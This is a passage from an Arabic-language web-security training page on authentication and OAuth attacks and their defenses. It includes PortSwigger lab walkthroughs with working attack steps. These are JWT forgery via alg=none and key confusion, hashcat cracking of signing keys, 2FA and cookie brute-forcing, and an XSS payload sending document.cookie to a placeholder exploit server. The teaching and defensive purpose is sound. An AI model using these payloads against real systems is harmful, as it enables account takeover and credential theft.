                <p><strong>المشكلة:</strong> ربط حسابات OAuth بدون التحقق من ملكية البريد الإلكتروني</p>
                
                <div class="code-block">
# سيناريو Account Linking Attack:

1. المهاجم ينشئ حساب على victim-app.com:
   Email: victim@example.com (بدون تحقق)

2. الضحية الحقيقية تسجل دخول بـ Google OAuth:
   Google Account: victim@example.com

3. التطبيق يربط حساب Google بحساب المهاجم (نفس البريد)!
4. المهاجم يسجل دخول بـ Google ويصل لحساب الضحية الحقيقي

# المشكلة:
- التطبيق لا يتحقق من ملكية البريد الإلكتروني
- الربط يتم بناءً على email address فقط

# الحل:
1. تحقق من ملكية البريد قبل الربط:
if (!user.email_verified) {
    throw new Error('Email must be verified before linking');
}

2. أرسل تأكيد للبريد الأصلي:
"هل تريد ربط حساب Google بحسابك؟"

3. استخدم unique identifier بدل email:
user.oauth_id = google_user.sub  // بدل google_user.email
                </div>

                <h4>🎭 5.2 OAuth Provider Mix-Up Attack</h4>
                <div class="mermaid">
sequenceDiagram
    participant U as 👤 المستخدم
    participant A as 🌐 التطبيق
    participant G as 🔵 Google
    participant F as 🔴 Facebook
    participant M as 🥷 المهاجم
    
    U->>A: 1. ينقر "Login with Google"
    A->>G: 2. redirect لـ Google OAuth
    M->>U: 3. يعترض ويغير لـ Facebook
    U->>F: 4. يسجل دخول بـ Facebook
    F->>A: 5. authorization code من Facebook
    A->>G: 6. يحاول استخدام Facebook code مع Google! 💥
    A->>A: 7. خطأ أو سلوك غير متوقع
                </div>

                <div class="code-block">
# OAuth Mix-Up Attack:

1. المستخدم ينقر "Login with Google"
2. التطبيق يوجه لـ:
https://accounts.google.com/oauth/authorize?client_id=google_id...

3. المهاجم يعترض ويغير الرابط لـ:
https://www.facebook.com/dialog/oauth?client_id=facebook_id...

4. المستخدم يسجل دخول بـ Facebook (يظن أنه Google)
5. Facebook يرسل authorization code للتطبيق
6. التطبيق يحاول استخدام Facebook code مع Google API!

# المشاكل المحتملة:
- تسريب معلومات حساسة
- ربط حسابات خاطئة  
- استغلال اختلافات في validation

# الحل:
1. تحقق من iss (issuer) في response:
if (token.iss !== 'https://accounts.google.com') {
    throw new Error('Invalid token issuer');
}

2. استخدم different redirect_uri لكل provider:
Google: https://app.com/oauth/google/callback
Facebook: https://app.com/oauth/facebook/callback

3. تحقق من state parameter يحتوي على provider info:
state = base64(JSON.stringify({provider: 'google', random: '...'}))
                </div>
            </div>

            <div class="attack-demo">
                <h3><i class="fas fa-clock"></i> 6. Token Lifecycle Attacks</h3>

                <h4>⏰ 6.1 Long-lived Access Tokens</h4>
                <div class="code-block">
# مشكلة Access Tokens طويلة المدى:

1. بعض التطبيقات تصدر access tokens تدوم أشهر:
{
  "access_token": "xyz789",
  "expires_in": 31536000  // سنة كاملة! 😱
}

2. إذا تسرب token، المهاجم يملك وصول لمدة طويلة
3. المستخدم لا يستطيع إلغاء الوصول بسهولة

# الحل:
✅ Access tokens قصيرة المدى (15-60 دقيقة)
✅ استخدم refresh tokens للتجديد
✅ وفر آلية token revocation
✅ راقب استخدام tokens غير الطبيعي

# مثال آمن:
{
  "access_token": "short_lived_token",
  "expires_in": 900,  // 15 دقيقة
  "refresh_token": "long_lived_refresh_token"
}
                </div>

                <h4>🔄 6.2 Refresh Token Abuse</h4>
                <div class="code-block">
# هجمات Refresh Token:

1. Refresh token theft:
- تخزين غير آمن في localStorage
- تسريب عبر XSS
- اعتراض network traffic

2. Refresh token reuse:
- استخدام نفس refresh token أكثر من مرة
- عدم إلغاء refresh tokens القديمة

3. Refresh token hijacking:
- المهاجم يحصل على refresh token
- ينشئ access tokens جديدة باستمرار

# الحل:
✅ تخزين refresh tokens بشكل آمن (httpOnly cookies)
✅ Refresh token rotation (إصدار refresh token جديد مع كل استخدام)
✅ ربط refresh token بـ device/IP
✅ مراقبة استخدام refresh tokens المشبوه

# مثال Refresh Token Rotation:
POST /token
{
  "grant_type": "refresh_token",
  "refresh_token": "old_refresh_token"
}

Response:
{
  "access_token": "new_access_token",
  "refresh_token": "new_refresh_token",  // جديد!
  "expires_in": 900
}
// old_refresh_token يصبح invalid فوراً
                </div>
            </div>

            <div class="tip">
                <h3><i class="fas fa-shield-alt"></i> أفضل الممارسات للحماية من هجمات OAuth</h3>
                <div class="grid">
                    <div class="card">
                        <h4>🔗 redirect_uri Security</h4>
                        <ul class="list">
                            <li>✅ Exact match للـ redirect_uri</li>
                            <li>✅ Whitelist مسجلة مسبقاً</li>
                            <li>✅ HTTPS only (عدا localhost للتطوير)</li>
                            <li>❌ لا تستخدم wildcards أو regex</li>
                            <li>❌ لا تسمح بـ data: أو javascript: URIs</li>
                        </ul>
                    </div>
                    
                    <div class="card">
                        <h4>🎯 State & PKCE</h4>
                        <ul class="list">
                            <li>✅ استخدم state parameter دائماً</li>
                            <li>✅ PKCE للـ mobile وSPA apps</li>
                            <li>✅ Strong randomness للـ state وcode_verifier</li>
                            <li>✅ ربط state بـ user session</li>
                            <li>❌ لا تستخدم predictable values</li>
                        </ul>
                    </div>
                    
                    <div class="card">
                        <h4>🔐 Token Management</h4>
                        <ul class="list">
                            <li>✅ Access tokens قصيرة المدى</li>
                            <li>✅ Refresh token rotation</li>
                            <li>✅ Token revocation endpoint</li>
                            <li>✅ Monitor suspicious token usage</li>
                            <li>❌ لا تضع tokens في URLs</li>
                        </ul>
                    </div>
                    
                    <div class="card">
                        <h4>🛡️ General Security</h4>
                        <ul class="list">
                            <li>✅ تحقق من email verification</li>
                            <li>✅ Validate iss (issuer) في tokens</li>
                            <li>✅ Use different endpoints per provider</li>
                            <li>✅ Rate limiting على OAuth endpoints</li>
                            <li>✅ Log وmonitor OAuth activities</li>
                        </ul>
                    </div>
                </div>
            </div>
        </section>

        <section id="labs">
            <h2><i class="fas fa-flask"></i> مختبرات عملية (15) - PortSwigger Academy</h2>
            
            <p>مختبرات متدرجة الصعوبة من PortSwigger Academy لتطبيق ما تعلمته عملياً. كل مختبر يحتوي على خطوات مفصلة ونصائح للحل.</p>

            <h3>🔓 مختبرات Authentication</h3>
            
            <div class="lab-card">
                <h4>🧪 Lab 1: Username enumeration via different responses</h4>
                <p><strong>الهدف:</strong> اكتشاف أسماء المستخدمين الصحيحة من خلال اختلاف الردود</p>
                <p><strong>التقنية:</strong> تحليل رسائل الخطأ المختلفة بين "Invalid username" و "Invalid password"</p>
                <div class="code-block">
# خطوات الحل:
1. استخدم Burp Intruder لتجربة قائمة usernames
2. ابحث عن اختلاف في response length أو error message
3. استخدم username الصحيح مع password list
4. سجل دخول بالبيانات الصحيحة
                </div>
                <a href="https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <div class="lab-card">
                <h4>🧪 Lab 2: 2FA broken logic</h4>
                <p><strong>الهدف:</strong> تجاوز المصادقة الثنائية عبر استغلال منطق معيب</p>
                <p><strong>التقنية:</strong> تغيير معرف المستخدم في cookie لتجاوز 2FA للضحية</p>
                <div class="code-block">
# خطوات الحل:
1. سجل دخول بحسابك وفعّل 2FA
2. اعترض طلب /login2 وغيّر verify parameter للضحية
3. أرسل طلب GET /login2 مع cookie للضحية
4. استخدم Brute Force على 4-digit 2FA code
5. سجل دخول كالضحية
                </div>
                <a href="https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <div class="lab-card">
                <h4>🧪 Lab 3: Password reset broken logic</h4>
                <p><strong>الهدف:</strong> استغلال عيب في منطق إعادة تعيين كلمة المرور</p>
                <p><strong>التقنية:</strong> تغيير username parameter في طلب reset لاستهداف ضحية أخرى</p>
                <div class="code-block">
# خطوات الحل:
1. ابدأ password reset لحسابك
2. اعترض طلب POST /forgot-password
3. غيّر username parameter للضحية (carlos)
4. استخدم reset token الخاص بك لتغيير كلمة مرور الضحية
5. سجل دخول بالبيانات الجديدة
                </div>
                <a href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <h3>🔐 مختبرات JWT</h3>

            <div class="lab-card">
                <h4>🧪 Lab 4: JWT authentication bypass via unverified signature</h4>
                <p><strong>الهدف:</strong> تجاوز المصادقة عبر JWT غير محقق التوقيع</p>
                <p><strong>التقنية:</strong> تعديل payload دون تحديث signature</p>
                <div class="code-block">
# خطوات الحل:
1. سجل دخول وانسخ JWT من cookie
2. فك تشفير JWT في jwt.io
3. غيّر "sub" من "wiener" إلى "administrator" 
4. احتفظ بنفس signature القديم
5. استبدل cookie واعرض /admin
                </div>
                <a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <div class="lab-card">
                <h4>🧪 Lab 5: JWT authentication bypass via flawed signature verification</h4>
                <p><strong>الهدف:</strong> استغلال ثغرة "none algorithm"</p>
                <p><strong>التقنية:</strong> تغيير alg إلى "none" وحذف signature</p>
                <div class="code-block">
# خطوات الحل:
1. فك تشفير JWT الحالي
2. غيّر header: {"alg":"none","typ":"JWT"}
3. غيّر payload: "sub" إلى "administrator"
4. أعد ترميز header.payload بـ Base64URL
5. JWT النهائي: header.payload. (بدون signature)
                </div>
                <a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <div class="lab-card">
                <h4>🧪 Lab 6: JWT authentication bypass via weak signing key</h4>
                <p><strong>الهدف:</strong> كسر مفتاح HMAC ضعيف وإنشاء JWT جديد</p>
                <p><strong>التقنية:</strong> استخدام hashcat لكسر secret ثم توقيع JWT جديد</p>
                <div class="code-block">
# خطوات الحل:
1. احفظ JWT في ملف: echo "jwt_here" > jwt.txt
2. كسر بـ hashcat: hashcat -a 0 -m 16500 jwt.txt /path/to/wordlist
3. استخدم secret المكسور لإنشاء JWT جديد:
   python3 -c "import jwt; print(jwt.encode({'sub':'administrator'}, 'secret', 'HS256'))"
4. استبدل cookie بالـ JWT الجديد
                </div>
                <a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <div class="lab-card">
                <h4>🧪 Lab 7: JWT authentication bypass via algorithm confusion</h4>
                <p><strong>الهدف:</strong> استغلال Key Confusion (RS256 → HS256)</p>
                <p><strong>التقنية:</strong> استخدام المفتاح العام كـ HMAC secret</p>
                <div class="code-block">
# خطوات الحل:
1. احصل على JWT وفك تشفيره
2. حمّل المفتاح العام من /jwks.json
3. حوّل JWK إلى PEM format
4. وقّع JWT جديد بـ HS256 مستخدماً المفتاح العام:
   jwt.encode({'sub':'administrator'}, public_key, 'HS256')
5. استبدل cookie وادخل /admin
                </div>
                <a href="https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <h3>🔗 مختبرات OAuth 2.0</h3>

            <div class="lab-card">
                <h4>🧪 Lab 8: Authentication bypass via OAuth implicit flow</h4>
                <p><strong>الهدف:</strong> تجاوز المصادقة في OAuth implicit flow</p>
                <p><strong>التقنية:</strong> تعديل email parameter في POST request</p>
                <div class="code-block">
# خطوات الحل:
1. ابدأ OAuth login مع social media
2. اعترض POST request إلى /authenticate
3. غيّر email parameter إلى carlos@carlos-montoya.net
4. أرسل الطلب وستسجل دخول كـ carlos
5. اعرض /admin لحذف المستخدم
                </div>
                <a href="https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <div class="lab-card">
                <h4>🧪 Lab 9: Forced OAuth profile linking</h4>
                <p><strong>الهدف:</strong> ربط حساب OAuth بحساب ضحية عبر CSRF</p>
                <p><strong>التقنية:</strong> إنشاء CSRF لربط حسابك بحساب admin</p>
                <div class="code-block">
# خطوات الحل:
1. ابدأ OAuth linking لحسابك
2. توقف قبل الخطوة الأخيرة وانسخ URL
3. أنشئ HTML page مع iframe للـ URL
4. أرسل الرابط للضحية (admin)
5. سجل دخول بحساب OAuth وستصبح admin
                </div>
                <a href="https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <div class="lab-card">
                <h4>🧪 Lab 10: OAuth account hijacking via redirect_uri</h4>
                <p><strong>الهدف:</strong> اختطاف حساب عبر استغلال redirect_uri</p>
                <p><strong>التقنية:</strong> توجيه authorization code لخادم المهاجم</p>
                <div class="code-block">
# خطوات الحل:
1. ابدأ OAuth flow وحلل redirect_uri
2. غيّر redirect_uri إلى https://YOUR-EXPLOIT-SERVER
3. أرسل الرابط للضحية
4. اعترض authorization code من exploit server logs
5. استخدم code لتسجيل الدخول كالضحية
                </div>
                <a href="https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <h3>💪 مختبرات متقدمة</h3>

            <div class="lab-card">
                <h4>🧪 Lab 11: Brute-forcing a stay-logged-in cookie</h4>
                <p><strong>الهدف:</strong> كسر stay-logged-in cookie مُرمز بـ Base64</p>
                <p><strong>التقنية:</strong> Brute force على MD5(password) المُرمز بـ Base64</p>
                <div class="code-block">
# خطوات الحل:
1. حلل stay-logged-in cookie: base64decode(username:md5(password))
2. أنشئ قائمة كلمات مرور مُرمزة: carlos:md5(password)
3. رمّز كل واحدة بـ Base64
4. استخدم Burp Intruder للـ brute force
5. سجل دخول بالـ cookie الصحيح
                </div>
                <a href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <div class="lab-card">
                <h4>🧪 Lab 12: Offline password cracking</h4>
                <p><strong>الهدف:</strong> استغلال XSS لسرقة cookie وكسر كلمة المرور</p>
                <p><strong>التقنية:</strong> XSS + Cookie theft + Password cracking</p>
                <div class="code-block">
# خطوات الحل:
1. اكتشف XSS في comment section
2. أنشئ payload لسرقة cookie:
   &lt;script&gt;document.location='https://YOUR-EXPLOIT-SERVER/'+document.cookie&lt;/script&gt;
3. اعترض stay-logged-in cookie من exploit server logs
4. فك تشفير وكسر MD5 hash
5. سجل دخول بالبيانات المكسورة
                </div>
                <a href="https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> فتح المختبر
                </a>
            </div>

            <div class="tip">
                <h4>💡 نصائح لحل المختبرات</h4>
                <ul class="list">
                    <li><strong>استخدم Burp Suite:</strong> أداة أساسية لاعتراض وتعديل الطلبات</li>
                    <li><strong>حلل الردود:</strong> ابحث عن اختلافات في response length أو error messages</li>
                    <li><strong>اقرأ التوثيق:</strong> كل مختبر له تلميحات مفيدة</li>
                    <li><strong>استخدم jwt.io:</strong> لفك تشفير وتحليل JWT tokens</li>
                    <li><strong>احفظ النتائج:</strong> وثق كل خطوة للمراجعة لاحقاً</li>
                </ul>
            </div>
        </section>

        <section id="defense">
            <h2><i class="fas fa-shield-halved"></i> طرق الحماية</h2>
            <div class="grid">
                <div class="card">
                    <h3>مصادقة وجلسات</h3>
                    <ul class="list">
                        <li>فرض MFA، قفل الحساب مؤقتاً، Hash قوي (Argon2/Bcrypt)</li>
                        <li>دوران الجلسة بعد تسجيل الدخول، HttpOnly + SameSite=strict</li>
                        <li>قوائم سماح IP للمشغلين الحساسين</li>
                    </ul>
                </div>
                <div class="card">
                    <h3>OAuth وآليات الرموز (JWT/JWE) آمنة</h3>
                    <ul class="list">
                        <li>PKCE إلزامي لكل التطبيقات العامة</li>
                        <li>تطابق صارم لـ redirect_uri بدون wildcards</li>
                        <li>تقليل الصلاحيات (Least Privilege) ومراجعة scopes</li>
                        <li>تدوير tokens، تقصير عمر access token، إبطال refresh token</li>
                        <li>JWS فقط للتحقق من السلامة؛ JWE عند الحاجة للسرية (يفضل AEAD مثل A256GCM)</li>
                        <li>رفض alg="none"، منع Key Confusion، إدارة مفاتيح آمنة وتدويرها</li>
                    </ul>
                </div>
            </div>
        </section>

        <section id="summary">
            <h2><i class="fas fa-list-check"></i> الخلاصة</h2>
            <p>Broken Authentication وOAuth أخطاء تصميم وتطبيق أكثر من كونها ثغرات منفردة. الحماية الفعالة تحتاج حوكمة الهوية، تنفيذ دقيق لـOAuth 2.0 + PKCE، وإدارة جلسات صارمة.</p>
        </section>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/prism.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
    <script>
        mermaid.initialize({
            startOnLoad: true,
            theme: 'dark',
            themeVariables: {
                primaryColor: '#42a5f5',
                primaryTextColor: '#e8eaed',
                primaryBorderColor: '#2d3748',
                lineColor: '#81c784',
                secondaryColor: '#1a2332',
                tertiaryColor: '#0f1724',
                background: '#1a2332',
                mainBkg: '#1a2332',
                secondBkg: '#0f1724',
                tertiaryBkg: '#2d3748',
                nodeBorder: '#2d3748',
                clusterBkg: '#0f1724',
                clusterBorder: '#2d3748',
                defaultLinkColor: '#81c784',
                titleColor: '#e8eaed',
                edgeLabelBackground: '#1a2332',
                nodeTextColor: '#e8eaed',
                // إضافات لضمان الوضوح
                textColor: '#e8eaed',
                actorTextColor: '#e8eaed',
                labelTextColor: '#e8eaed',
                loopTextColor: '#e8eaed',
                activationTextColor: '#e8eaed',
                sectionBkgColor: '#1a2332',
                altSectionBkgColor: '#0f1724',
                gridColor: '#2d3748',
                c0: '#42a5f5',  // Class diagram colors
                c1: '#81c784',
                c2: '#ff9800',
                c3: '#e91e63'
            }
        });
    </script>
</body>
</html> 